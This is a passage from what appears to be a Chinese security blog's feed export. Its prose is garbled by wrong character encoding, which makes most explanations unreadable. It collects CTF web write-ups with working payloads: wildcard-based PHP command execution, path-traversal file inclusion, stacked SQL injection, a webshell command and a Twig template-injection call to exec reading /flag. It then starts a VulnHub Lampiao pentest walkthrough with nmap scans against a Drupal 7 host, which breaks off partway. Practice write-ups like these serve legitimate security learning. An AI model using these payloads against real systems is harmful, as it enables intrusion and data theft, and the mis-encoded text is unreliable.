title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h3><p>1.åˆ©ç”¨.æ¥æ‰§è¡Œè„šæœ¬</p><p>2.åˆ©ç”¨linuxçš„é€šé…ç¬¦æ¥å®ç°åŒ¹é…æ–‡ä»¶çš„åå­—</p><h3 id="è§£é¢˜ï¼š-8"><a href="#è§£é¢˜ï¼š-8" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h3><p>æ„é€ postæ–‡ä»¶ä¸Šä¼ çš„æ•°æ®åŒ…ç”¨æ¥ä¸Šä¼ æ–‡ä»¶ï¼šå°†ä»¥ä¸‹ä»£ç åœ¨æœ¬åœ°æ„é€ ï¼Œç„¶åæµè§ˆå™¨è¿è¡Œå†æŠ“åŒ…</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POSTæ•°æ®åŒ…POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>æ–‡ä»¶åï¼š<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>æäº¤<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†™è„šæœ¬ï¼š</p><pre><code>#!/bin/shcat /flag</code></pre><p>æ„é€ pocï¼š</p><pre><code>?code=?&gt;&lt;?=`. /???/????????[?-[]`;?&gt;</code></pre><h2 id="2018-HCTF-Web-warmup"><a href="#2018-HCTF-Web-warmup" class="headerlink" title="2018-HCTF-Web-warmup"></a>2018-HCTF-Web-warmup</h2><p>è®¿é—®source.php</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¿é—®hint.phpï¼š</p><p>flag not here, and flag in ffffllllaaaagggg</p><p>åˆ©ç”¨çš„æ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</p><p>åˆ©ç”¨sourceä¸­çš„includeï¼Œæ¥å°†flag.phpåœ¨source.phpä¸­æ˜¾ç¤ºå‡ºæ¥</p><pre><code>?file=source.php?/../../../../ffffllllaaaagggg</code></pre><p>ç„¶åè¿›è¡Œä¸¤æ¬¡URLç¼–ç :</p><pre><code>?file=source.php%253F/../../../../ffffllllaaaagggg</code></pre><p>æ³¨æ„ç»†èŠ‚ï¼š/../../../../ffffllllaaaagggg</p><h2 id="å¼ºç½‘æ¯-2019-Web-é«˜æ˜çš„é»‘å®¢"><a href="#å¼ºç½‘æ¯-2019-Web-é«˜æ˜çš„é»‘å®¢" class="headerlink" title="å¼ºç½‘æ¯-2019-Web-é«˜æ˜çš„é»‘å®¢"></a>å¼ºç½‘æ¯-2019-Web-é«˜æ˜çš„é»‘å®¢</h2><p>ç»™äº†ä¸€å¤§å †phpåé—¨æ–‡ä»¶ï¼Œè¦ç”¨è„šæœ¬å»è·‘å¯ä»¥ç”¨çš„æ–‡ä»¶</p><p>æœ¨é©¬ï¼šxk0SzyKwfzw.php?Efa5BVG=cat /flag</p><p>Efa5BVG</p><h2 id="SUCTF-2019-Web-easysql"><a href="#SUCTF-2019-Web-easysql" class="headerlink" title="SUCTF-2019-Web-easysql"></a>SUCTF-2019-Web-easysql</h2><h3 id="çŸ¥è¯†ç‚¹ï¼š-1"><a href="#çŸ¥è¯†ç‚¹ï¼š-1" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h3><p>åˆ©ç”¨mysqlçš„å†…ç½®å˜é‡å°†||çš„æ€§è´¨æ”¹å˜ä¸ºå­—ç¬¦ä¸²çš„è¿æ¥ç¬¦ï¼Œè€Œéæˆ–è¿ç®—ç¬¦</p><p>å †å æ³¨å…¥</p><h3 id="æ“ä½œï¼š"><a href="#æ“ä½œï¼š" class="headerlink" title="æ“ä½œï¼š"></a>æ“ä½œï¼š</h3><p>æºç ï¼š</p><pre><code>select $_GET[&#39;query&#39;] || flag from flag</code></pre><p>è§£æ³•ä¸€ï¼š</p><pre><code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></pre><p>ç›¸å½“äºï¼šselect 1,flag from Flag</p><p>è§£æ³•äºŒï¼š</p><pre><code>*,1</code></pre><p>ç›¸å½“äºselect *,1||flag from Flag å–å¾—å…¨éƒ¨æ•°æ®</p><h2 id="BJDCTF-2020-web-cookie-is-so-subtle-å°šæœªè§£å†³"><a href="#BJDCTF-2020-web-cookie-is-so-subtle-å°šæœªè§£å†³" class="headerlink" title="BJDCTF-2020-web-cookie is so subtle!(å°šæœªè§£å†³)"></a>BJDCTF-2020-web-cookie is so subtle!(å°šæœªè§£å†³)</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201102181051434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åˆ©ç”¨è¿™ä¸ªæ–¹æ³•æ¥åˆ¤æ–­æ¨¡æ¿æ³¨å…¥çš„å“ªä¸ªæ¨¡æ¿ï¼Œç„¶åè¿”å›å€¼ä¸º49æ‰€ä»¥æ˜¯Twigï¼Œå¦‚æœæ˜¯7777777åˆ™æ˜¯Jinja2</p><p>ç„¶åæœç´¢ä¸€ä¸‹twigçš„æ¨¡æ¿æ³¨å…¥</p><pre><code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥é—¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lampiaoæ¸—é€æµ‹è¯•åˆæ¢</title>
      <link href="/2020/12/19/lampiao-shen-tou-chu-tan/"/>
      <url>/2020/12/19/lampiao-shen-tou-chu-tan/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="lampiaoé¶æœºæ¸—é€æµ‹è¯•ç¬”è®°"><a href="#lampiaoé¶æœºæ¸—é€æµ‹è¯•ç¬”è®°" class="headerlink" title="lampiaoé¶æœºæ¸—é€æµ‹è¯•ç¬”è®°"></a>lampiaoé¶æœºæ¸—é€æµ‹è¯•ç¬”è®°</h1><h4 id="ç®€å•ä»‹ç»ï¼š"><a href="#ç®€å•ä»‹ç»ï¼š" class="headerlink" title="ç®€å•ä»‹ç»ï¼š"></a>ç®€å•ä»‹ç»ï¼š</h4><pre><code>Would you like to keep hacking in your own lab?Try this brand new vulnerable machine! &quot;LampiÃ£o 1&quot;.Get root!Level: Easyç¿»è¯‘ï¼šä½ æƒ³åœ¨è‡ªå·±çš„å®éªŒå®¤é‡Œç»§ç»­é»‘å®¢æ”»å‡»å—ï¼Ÿè¯•è¯•è¿™ä¸ªå…¨æ–°çš„æ˜“å—æ”»å‡»çš„æœºå™¨ï¼â€LampiÃ£o 1â€ã€‚è·å¾—rootæƒé™çº§åˆ«ï¼šç®€å•ä¸‹è½½åœ°å€ï¼šhttps://www.vulnhub.com/entry/lampiao-1,249/</code></pre><h4 id="é‡‡å‘ï¼š"><a href="#é‡‡å‘ï¼š" class="headerlink" title="é‡‡å‘ï¼š"></a>é‡‡å‘ï¼š</h4><p>1.ä¸‹è½½é¶æœºåä¼šå‘ç°ovfæ–‡ä»¶ï¼Œç”¨VMwareæ‰“å¼€</p><p>2.å‹ç¼©åŒ…ä¸è¦è§£å‹ï¼</p><h2 id="OKäº†ï¼Œå¼€å§‹æµ‹è¯•ï¼š"><a href="#OKäº†ï¼Œå¼€å§‹æµ‹è¯•ï¼š" class="headerlink" title="OKäº†ï¼Œå¼€å§‹æµ‹è¯•ï¼š"></a>OKäº†ï¼Œå¼€å§‹æµ‹è¯•ï¼š</h2><h3 id="ç¬¬ä¸€é˜¶æ®µï¼šä¿¡æ¯æ”¶é›†"><a href="#ç¬¬ä¸€é˜¶æ®µï¼šä¿¡æ¯æ”¶é›†" class="headerlink" title="ç¬¬ä¸€é˜¶æ®µï¼šä¿¡æ¯æ”¶é›†"></a>ç¬¬ä¸€é˜¶æ®µï¼šä¿¡æ¯æ”¶é›†</h3><p>ifconfigæŸ¥çœ‹è‡ªå·±çš„ipåœ°å€ï¼š192.168.204.xxx</p><h4 id="æ‰«æè‡ªå·±çš„å†…ç½‘ï¼ˆå‘ç°é˜¶æ®µï¼‰"><a href="#æ‰«æè‡ªå·±çš„å†…ç½‘ï¼ˆå‘ç°é˜¶æ®µï¼‰" class="headerlink" title="æ‰«æè‡ªå·±çš„å†…ç½‘ï¼ˆå‘ç°é˜¶æ®µï¼‰"></a>æ‰«æè‡ªå·±çš„å†…ç½‘ï¼ˆå‘ç°é˜¶æ®µï¼‰</h4><pre><code>nmap -sP 192.168.204.0/24</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//1.jpg" alt></p><p>è¿™é‡Œæ˜¯å¯¹-sPå‘½ä»¤çš„ä»‹ç»ï¼š</p><p>1.-Pnæ˜¯é»˜è®¤ç›®æ ‡ä¸»æœºæ˜¯å­˜æ´»çš„ï¼Œ-sPæ˜¯ä½¿ç”¨ICMPåè®®å‘é€echoè¯·æ±‚æ•°æ®åŒ…ï¼Œä½†æ˜¯å¾ˆå®¹æ˜“è¢«é˜²ç«å¢™è¿‡æ»¤æ‰ã€‚æƒ³å°½å¯èƒ½å‘ç°æ‰€æœ‰å­˜æ´»ä¸»æœºçš„è¯ï¼Œå»ºè®®ä½¿ç”¨åŠå¼€å¼æ‰«æå‚æ•°-sSæˆ–è€…ACKæ‰«æå‚æ•°-sAï¼Œè¿˜æ— æ³•ç¡®å®šå­˜æ´»ä¸»æœºçš„è¯å¯ä»¥è¯•è¯•-sF -sX -sNç­‰å‚æ•°ã€‚</p><p>2.nmap æ‰§è¡Œï¼ˆè‡³å°‘ï¼‰ä¸¤æ­¥æ“ä½œï¼Œä¸€ä¸ªæ˜¯ä¸»æœºå‘ç°ï¼ˆPingï¼‰ï¼Œå¦ä¸€ä¸ªæ˜¯ä¸»æœºæ‰«æã€‚é»˜è®¤ä¸¤æ­¥æ˜¯éƒ½åšçš„ï¼Œ-P0/-Pn å…³é—­ä¸»æœºå‘ç°ï¼Œ-sP/-sn å…³é—­ä¸»æœºæ‰«æã€‚ä¸¤ä¸ªä¸€èµ·ç”¨å°±æ˜¯å•¥ä¹Ÿä¸å¹²ï¼Œæ¯”å¦‚ nmap 0.0.0.0 -P0 -sP æ˜¾ç¤ºâ€œhost is upâ€ã€‚æŒ‰ç…§ä½ çš„è¦æ±‚ï¼Œä¸åšä¸»æœºæ‰«æï¼Œåº”è¯¥æ˜¯ -sPï¼ŒPing åè®®/ç«¯å£è¢«æŒ¡ï¼Œå¯ä»¥ç”¨ -P çš„å…¶å®ƒé€‰é¡¹ã€‚æ¯”å¦‚ç”¨ TCP SYN -PS åº”è¯¥æ˜¯æœ€å¿«çš„ï¼ŒUDP -PU ä¹Ÿå¯ä»¥ã€‚</p><p>åªæ˜¯æ‰«ææ•´ä¸ªç½‘æ®µé‡Œé¢çš„æ‰€æœ‰ipï¼Œå¦‚æœæœ‰pingçš„é€šçš„ï¼Œé€šè¿‡-sPå‘½ä»¤ä¼šç»™ä½ æ˜¾ç¤ºå‡ºæ¥ï¼ˆå­˜æ´»çš„ä¸»æœºï¼‰ã€‚</p><p>è¿™é‡Œå‘ç°æ‰«æåˆ°çš„ä¸»æœºæœ‰å¥½å‡ å°ï¼Œä½†æ˜¯æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è·å–lampiaoçš„ipåœ°å€ï¼Œsoéœ€è¦è¿›ä¸€æ­¥åˆ¤æ–­ï¼š</p><p>1.åœ¨lampiaoé¶æœºçš„ç½‘ç»œé…ç½®é‡Œé¢æ‰¾åˆ°macåœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//2.png" alt></p><p>2.åœ¨å­˜æ´»çš„ä¸»æœºé‡Œé¢æ‰¾åˆ°ä¸ä¹‹ç›¸å¯¹åº”çš„macåœ°å€</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//3.png" alt></p><p>3.å¾—åˆ°lampiaoçš„IPåœ°å€:192.168.204.137</p><h4 id="å¼€å§‹å¯¹ä¸»æœºè¿›è¡Œæ‰«æï¼š"><a href="#å¼€å§‹å¯¹ä¸»æœºè¿›è¡Œæ‰«æï¼š" class="headerlink" title="å¼€å§‹å¯¹ä¸»æœºè¿›è¡Œæ‰«æï¼š"></a>å¼€å§‹å¯¹ä¸»æœºè¿›è¡Œæ‰«æï¼š</h4><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š</p><pre><code>nmap -A -p- -T4 192.168.204.137</code></pre><pre><code>è¿™é‡Œ-pæ˜¯æŒ‡æ‰€æœ‰çš„ç«¯å£nmap -p(port1,port2,port3,...) &lt;target ip&gt;  è§£é‡Šï¼šæŒ‡å®šå‡ ä¸ªç«¯å£è¿›è¡Œæ‰«æä¾‹å­ï¼šnmap -p80,443,22,21,8080,25,53 192.168.2.107</code></pre><pre><code>-T4ï¼š æŒ‡å®šæ‰«æè¿‡ç¨‹ä½¿ç”¨çš„æ—¶åºï¼Œæ€»æœ‰6ä¸ªçº§åˆ«ï¼ˆ0-5ï¼‰ï¼Œçº§åˆ«è¶Šé«˜ï¼Œæ‰«æé€Ÿåº¦è¶Šå¿«ï¼Œä½†ä¹Ÿå®¹æ˜“è¢«é˜²ç«å¢™æˆ–IDSæ£€æµ‹å¹¶å±è”½æ‰ï¼Œåœ¨ç½‘ç»œé€šè®¯çŠ¶å†µè¾ƒå¥½çš„æƒ…å†µä¸‹æ¨èä½¿ç”¨T4</code></pre><pre><code>nmap -A &lt;target ip&gt; è§£é‡Šï¼šnmap ä¸‡èƒ½å¼€å…³æ¬¡é€‰é¡¹è®¾ç½®åŒ…å«äº†1-10000çš„ç«¯å£pingæ‰«æï¼Œæ“ä½œç³»ç»Ÿæ‰«æï¼Œè„šæœ¬æ‰«æï¼Œè·¯ç”±è·Ÿè¸ªï¼ŒæœåŠ¡æ¢æµ‹ã€‚ä¾‹å­ï¼šnmap -A 192.168.2.107</code></pre><p>ç»è¿‡æ‰«æå¾—åˆ°äº†3ä¸ªç«¯å£ï¼š22ã€80ã€1898</p><pre><code>å¯ä»¥å‘ç°ï¼Œç›®æ ‡ä¸»æœºå¼€æ”¾äº†ä¸‰ä¸ªç«¯å£ï¼Œåˆ†åˆ«æ˜¯22,80å’Œ1898,22ç«¯å£æ˜¯sshæœåŠ¡ï¼Œ80ç«¯å£æ˜¯httpæœåŠ¡ï¼Œä½†æ˜¯ä¿¡æ¯ä¸æ˜¯å¾ˆè¯¦ç»†ï¼Œ1898ç«¯å£å¼€æ”¾çš„æ˜¯httpæœåŠ¡ï¼Œå¹¶ä¸”ä½¿ç”¨äº†Drupalæ¡†æ¶</code></pre><p>å¦ä¸€ç§æ‰«ææ–¹æ³•ï¼š</p><pre><code>nmap -sS -sV -Pn -n  -A 192.168.191.133-sS ä½¿ç”¨SYNåŠå¼€å¼æ‰«æï¼Œè¿™ç§æ‰«ææ–¹å¼ä½¿å¾—æ‰«æç»“æœæ›´åŠ æ­£ç¡®(åˆç§°åŠå¼€æ”¾,æˆ–éšèº«æ‰«æ)-sV æ¢æµ‹ç«¯å£çš„æœåŠ¡ç±»å‹/å…·ä½“ç‰ˆæœ¬ç­‰ä¿¡æ¯-Pn ç¦ç”¨ä¸»æœºæ£€æµ‹,ç›®æ ‡ä¸»æœºå±è”½äº†pingè¯·æ±‚æ—¶å¯ç”¨-nè¡¨ç¤ºä¸è¿›è¡Œdnsè§£æï¼Œ-pè¡¨ç¤ºè¦-Aå¼ºåŠ›æ‰«æï¼Œè€—æ—¶é•¿</code></pre><p>è¿™ç§æ–¹æ³•æ¯”ä¸Šä¸€ç§æ–¹æ³•è¦å¿«ï¼Œä¸”æ›´ä¸ºä¿é™©</p><p>Drupalæ¡†æ¶æ˜¾ç¤ºåœ¨è¿™é‡Œï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//4.png" alt></p><p>å¾—åˆ°ç‰ˆæœ¬ä¸º7ï¼ˆå¿˜è®°æˆªå±äº†ï¼‰ï¼Œè¿˜å‘ç°äº†ä¸€äº›ç›®å½•å’Œæ–‡ä»¶ï¼ï¼</p><p>ä¾‹å¦‚ï¼š/robots.txtæ–‡ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//5.png" alt>g)</p><p>ç„¶åæ‰“å¼€æµè§ˆå™¨è®¿é—®192.168.204.137:80ç«¯å£å¾—åˆ°å¦‚ä¸‹é¡µé¢ï¼ˆå•¥ä¹Ÿæ²¡æœ‰ã€‚ã€‚ã€‚ï¼‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//6.png" alt></p><p>ä½†æ˜¯å½“æˆ‘ä»¬è®¿é—®1898ç«¯å£çš„æ—¶å€™å‡ºç°å¦‚ä¸‹é¡µé¢ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//7.png" alt></p><h3 id="ç¬¬äºŒé˜¶æ®µï¼šæ¼æ´åˆ©ç”¨"><a href="#ç¬¬äºŒé˜¶æ®µï¼šæ¼æ´åˆ©ç”¨" class="headerlink" title="ç¬¬äºŒé˜¶æ®µï¼šæ¼æ´åˆ©ç”¨"></a>ç¬¬äºŒé˜¶æ®µï¼šæ¼æ´åˆ©ç”¨</h3><pre><code>åœ¨æ‰«æç«¯å£çš„æ—¶å€™å¯ä»¥å‘ç°ç›®æ ‡ä½¿ç”¨äº†Drupalæ¡†æ¶ï¼Œå¹¶ä¸”æ˜¯7çš„ç‰ˆæœ¬ï¼Œ7çš„ç‰ˆæœ¬å­˜åœ¨ä¸€äº›æ¼æ´ï¼Œå¯ä»¥åˆ©ç”¨è¿™äº›æ¼æ´æ¥è·å¾—shellåœ¨ç½‘ç«™ä¸­æŸ¥æ‰¾ä¿¡æ¯ï¼Œçœ‹èƒ½å¦æ‰¾åˆ°Drupalçš„å…·ä½“ç‰ˆæœ¬æŸ¥çœ‹ç½‘ç«™çš„robots.txtæ–‡ä»¶</code></pre><p>è¿™é‡Œæ˜¯å› ä¸ºé€šè¿‡æ‰«æå‘ç°äº†robots.txtï¼ˆå±äºæ•æ„Ÿä¿¡æ¯èŒƒç•´ï¼‰</p><p>è®¿é—®ï¼š</p><p>192.168.204.137:1898/robots.txt</p><p>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//8.png" alt></p><p>è¿™é‡Œæ˜¯åœ¨æ³¨é‡Šä¸ºæ–‡ä»¶ä¸€æ 